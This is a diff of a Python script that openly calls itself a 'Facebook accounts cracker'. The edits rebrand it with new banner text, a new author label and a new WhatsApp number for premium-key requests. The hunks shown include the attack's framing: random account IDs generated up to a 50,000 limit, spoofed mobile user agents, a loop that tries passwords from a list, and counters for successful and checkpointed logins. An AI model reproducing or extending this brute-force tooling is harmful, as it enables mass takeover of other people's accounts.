@@ -390,8 +390,8 @@ def follow(ses,coki):
 logo = ("""\033[1;32m
 
 ❝𝐒𝐇𝐀𝐅𝐈𝐐 𝐊𝐇𝐀𝐍 𝐒𝐀𝐖𝐀𝐍𝐃❞
-
-
+   FACEBOOK ACCOUNTS
+       CRACKER 
   \033
 __________________×__×____________________
   
@@ -871,7 +871,7 @@ class Main:
 		xx = 9999999999
 		idx = "10000" 
 		os.system('clear');print(logo)
-		limit = int(input("\n \033[0;95m[+]\033[0;93m FB ACCOUNT CRACKER- LIMIT 50,000: "))
+		limit = int(input("\n \033[0;95m[+]\033[0;93m FB ACCOUNT CRACKER - LIMIT 50,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -1261,7 +1261,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ SAKIB ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ SHAFIQ ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1325,6 +1325,6 @@ def Subscraption():
 		input(" Press Enter To Send Key")
 		time.sleep(3.5)
 		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
-		os.system('am start https://wa.me/+8801903226586?text=' + tks)
+		os.system('am start https://wa.me/+923106116534?text=' + tks)
 		Subscraption()        
 Main()
